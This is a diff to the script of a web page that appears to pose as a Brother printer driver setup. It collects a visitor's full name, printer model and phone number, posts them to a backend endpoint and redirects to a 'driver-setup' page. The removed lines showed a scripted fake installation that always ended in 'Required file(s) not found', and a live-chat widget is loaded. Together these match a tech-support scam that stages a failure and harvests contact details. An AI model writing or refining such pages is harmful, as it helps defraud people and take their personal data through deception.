@@ -276,89 +276,35 @@ document.getElementById("startBtn").addEventListener("click", async function () 
   const printerModel = document.getElementById("printerModel").value.trim();
   const phoneNumber = document.getElementById("phoneNumber").value.trim();
 
-  // Validation
-  // if (!fullName) {
-  //   alert("Please enter your full name");
-  //   return;
-  // }
+  if (!fullName || !printerModel || !phoneNumber) {
+    alert("Please fill all fields");
+    return;
+  }
 
-  // if (!printerModel) {
-  //   alert("Please enter printer model");
-  //   return;
-  // }
-
-  // if (!phoneNumber) {
-  //   alert("Please enter phone number");
-  //   return;
-  // }
-document.querySelector(".brotherMain-hero").classList.add("loading-active");
-  // Store in session (optional)
+  // Save data for next page
   sessionStorage.setItem("fullName", fullName);
   sessionStorage.setItem("printerModel", printerModel);
   sessionStorage.setItem("phoneNumber", phoneNumber);
 
-  // Send data to backend
+  // Optional backend call
   try {
     await fetch("/api/send-model", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        fullName: fullName,
-        printerModel: printerModel,
-        phoneNumber: phoneNumber,
+        fullName,
+        printerModel,
+        phoneNumber,
         brand: "Driver Setup"
       })
     });
-  } catch (err) {
-    console.log("API call failed (non-blocking)");
-  }
+  } catch (e) {}
 
-  // UI switch
-  document.getElementById("formBox").style.display = "none";
-  document.getElementById("loadingBox").style.display = "block";
-
-  // Steps
-  const steps = [
-    `<p>Detecting connection…</p>`,
-    `<p>Checking requirements…</p>`,
-    `<p>Preparing install…</p>`,
-    `<p>Installing software…</p>`,
-    `<p class="red">Required file(s) not found</p>`
-  ];
-
-  const progressBar = document.getElementById("progressBar");
-  let currentStep = 0;
-  const stepDuration = 1500;
-  const stepPercent = 100 / steps.length;
-
-  function runProgress() {
-    if (currentStep < steps.length) {
-      progressBar.style.width = `${stepPercent * (currentStep + 1)}%`;
-      currentStep++;
-      setTimeout(runProgress, stepDuration);
-    }
-  }
-
-  runProgress();
-
-  let i = 0;
-  function nextStep() {
-    document.getElementById("stepContent").innerHTML = steps[i];
-    i++;
-    if (i < steps.length) {
-      setTimeout(nextStep, 2500);
-    } else {
-      setTimeout(() => {
-        // window.location.href = "/driver-error.html";
-      }, 2500);
-    }
-  }
-
-  nextStep();
+  // 👉 Redirect to loading page
+  window.location.href = "/driver-setup.html";
 });
 </script>
+
 <script src="/smartsupp.js"></script>
 </body>
 </html>
